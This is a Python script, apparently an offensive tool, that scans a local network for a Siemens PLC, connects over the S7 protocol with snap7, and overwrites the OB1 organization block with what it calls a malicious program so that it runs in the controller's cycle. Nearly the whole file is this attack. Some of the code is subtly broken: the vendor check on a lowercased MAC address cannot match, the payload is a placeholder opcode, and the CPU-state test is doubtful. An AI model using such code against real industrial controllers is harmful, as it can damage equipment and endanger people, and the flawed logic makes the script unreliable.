import snap7
from snap7.util import *
from snap7.types import *
import scapy.all as scapy

def find_plc_ip():
    """ Discovers the PLC's IP address using ARP requests on the local network. """
    arp_request = scapy.ARP(pdst="192.168.1.1/24")  # Adjust based on network
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast / arp_request
    answered_list = scapy.srp(arp_packet, timeout=2, verbose=False)[0]

    for sent, received in answered_list:
        if "Siemens" in received.hwsrc.lower():  # Identify Siemens PLC based on MAC
            return received.psrc  # PLC's IP Address

    return None

def connect_to_plc(ip):
    """ Establishes a connection to the PLC """
    plc = snap7.client.Client()
    plc.connect(ip, 0, 1)  # Rack 0, Slot 1 (Typical for Siemens S7-1200/1500)
    return plc

def modify_tasking(plc):
    """ Modifies the OB1 Organization Block to insert a new malicious program """
    ob1_block_num = 1  # Organization Block OB1
    new_program_code = b"\x10\x02\x55\x44"  # Dummy Opcode - Replace with real logic
    
    print("[*] Uploading modified OB1 block...")
    
    try:
        plc.download(ob1_block_num, new_program_code)  # Overwrite OB1 with new logic
        print("[+] Task modified successfully: Program added to cyclic execution.")
    except Exception as e:
        print(f"[-] Failed to modify OB1: {str(e)}")

def main():
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("[-] PLC IP not found. Exiting...")
        return

    print(f"[+] PLC found at {plc_ip}, attempting connection...")
    plc = connect_to_plc(plc_ip)

    if plc.get_cpu_state() == "RUN":
        modify_tasking(plc)
    else:
        print("[-] PLC is not in RUN mode. Modification aborted.")
    
    plc.disconnect()

if __name__ == "__main__":
    main()